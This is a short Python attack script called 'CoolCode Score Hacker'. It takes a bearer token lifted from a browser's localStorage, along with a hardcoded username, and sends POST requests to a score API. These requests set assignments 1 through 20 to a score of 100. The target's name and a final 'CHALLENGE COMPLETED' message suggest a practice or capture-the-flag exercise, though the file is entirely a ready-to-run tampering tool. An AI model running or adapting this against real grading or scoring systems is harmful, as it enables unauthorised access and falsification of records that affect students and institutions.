#!/usr/bin/env python3
"""
CoolCode Score Hacker with Token
Use the ACCESS_TOKEN you found to hack scores
"""

import requests
import json
import time

def hack_scores_with_token():
    """Hack scores using the ACCESS_TOKEN"""
    
    print("🔥 CoolCode Score Hacker with Token 🔥")
    print("=" * 50)
    
    # Your token from localStorage
    access_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
    username = "CX8de3ce71-3cbTY"
    api_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    
    # Headers with Bearer token
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json"
    }
    
    print(f"🎯 Target: {username}")
    print(f"🔑 Token: {access_token[:50]}...")
    print(f"🌐 API: {api_url}")
    print("=" * 50)
    
    # Test first assignment
    print("🧪 Testing Assignment 1...")
    
    payload = {
        "username": username,
        "assignmentId": 1,
        "score": 100
    }
    
    try:
        response = requests.post(api_url, json=payload, headers=headers, timeout=10)
        print(f"Test Result: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ SUCCESS! Token works!")
            
            # Hack all assignments
            print("\n🚀 Hacking all assignments...")
            successful = []
            
            for assignment_id in range(1, 21):
                payload = {
                    "username": username,
                    "assignmentId": assignment_id,
                    "score": 100
                }
                
                try:
                    response = requests.post(api_url, json=payload, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"✅ Assignment {assignment_id:2d}: SUCCESS")
                        successful.append(assignment_id)
                    else:
                        print(f"❌ Assignment {assignment_id:2d}: {response.status_code}")
                        
                except Exception as e:
                    print(f"💥 Assignment {assignment_id:2d}: {e}")
                
                # Small delay
                time.sleep(0.2)
            
            print("\n" + "=" * 50)
            print(f"🎯 HACK COMPLETE!")
            print(f"✅ Successfully hacked: {len(successful)}/20 assignments")
            if successful:
                print(f"📋 Successful assignments: {successful}")
            print("🎉 CHALLENGE COMPLETED!")
            print("=" * 50)
            
        else:
            print(f"❌ Token test failed: {response.status_code}")
            print("💡 Try refreshing the page and getting a new token")
            
    except Exception as e:
        print(f"💥 Error: {e}")

if __name__ == "__main__":
    hack_scores_with_token()
